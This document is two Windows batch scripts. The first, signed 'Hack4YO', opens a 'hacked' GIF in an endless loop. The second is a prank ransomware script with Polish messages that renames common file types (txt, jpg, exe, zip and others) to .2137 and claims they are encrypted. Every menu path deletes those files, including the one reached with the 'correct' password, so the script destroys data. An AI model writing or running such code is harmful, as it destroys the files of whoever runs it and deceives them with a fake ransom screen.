@echo off
:1
color a 
echo author:Hack4YO
start https://c.tenor.com/He2W0AQvZfsAAAAC/hacked-hack.gif
start https://youtu.be/xy2AUq3V8hc
:2
start https://c.tenor.com/He2W0AQvZfsAAAAC/hacked-hack.gif
goto 2 



@echo off
color a

:wirus
Ren *.txt *.2137
Ren *.iso *.2137
Ren *.png *.2137
Ren *.jpg *.2137
Ren *.mp4 *.2137
Ren *.wav *.2137
Ren *.zip *.2137
Ren *.rar *.2137
Ren *.mp3 *.2137
Ren *.exe *.2137
goto poczatek

:poczatek
cls
echo ----------------------------------------------------------------------------------------
echo twoje pliki zostaly zaszyfrowane na zawsze  przez wirus ransomware :(
echo ----------------------------------------------------------------------------------------
echo.
echo 1) wpisz haslo
echo 2) usun pliki
echo 3) wylacz program 
echo 4) skad wziac haslo?
echo.
set /p opcja=wybierz:
if %opcja%==1 goto opcja1
if %opcja%==2 goto opcja2
if %opcja%==3 goto opcja3
if %opcja%==4 goto opcja4

:opcja1
cls
echo wpisz tutaj haslo
set/p klucz=klucz:
if %klucz%==098-000-100  goto dobrze
if not %klucz%==098-000-100 goto zle
:dobrze 
echo haslo poprawne odszyfrowuje
pause 
echo zart pliki zostana usuniete po wylaczeniu programu :)
pause
del *.2137
pause
exit
:zle
echo zle haslo sprobuj jeszcze raz
pause
goto poczatek
:opcja2
cls
echo wybrano Kasowanie plikow 
del *.2137
echo pliki zostaly usuniete
pause
exit
:opcja3
cls
echo wybrano wyjscie
echo gratuluje twoje pliki sa nie do odzyskania
pause
del *.bat
:opcja4
cls
echo nie da sie przykro mi 
echo.
echo.
pause
goto poczatek
